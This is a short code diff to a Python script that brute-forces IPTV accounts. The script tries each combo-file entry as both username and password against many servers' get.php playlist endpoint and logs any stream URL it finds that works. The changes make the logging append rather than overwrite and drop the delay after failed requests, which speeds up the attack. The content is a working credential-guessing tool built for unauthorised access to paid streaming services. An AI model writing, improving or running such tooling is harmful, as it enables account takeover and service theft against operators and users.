@@ -74,17 +74,17 @@ def aliveOrNot(urls):
     
 def bruteAccounts(urls,comboFile):
     for user in open(comboFile, 'r').readlines():
-        print "[i] Trying combo: %s" %(user)
+        print "[i] Trying combo: %s" %(user.strip())
         for url in urls:
             try:
                 accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=ts" %(url.strip(), user.strip(), user.strip())
                 if "#EXTINF:0" in get(accountToTry, timeout=5, stream=True).text:
                     print "[+] Playlist URL found: %s" %(accountToTry)
-                    f = open("logs.txt", "w")
+                    f = open("logs.txt", "a")
                     f.write("%s\n" %(accountToTry))
                     f.close()
             except Exception as e:
-                sleep(2)
+                pass
         
 if __name__ == '__main__':
     try:
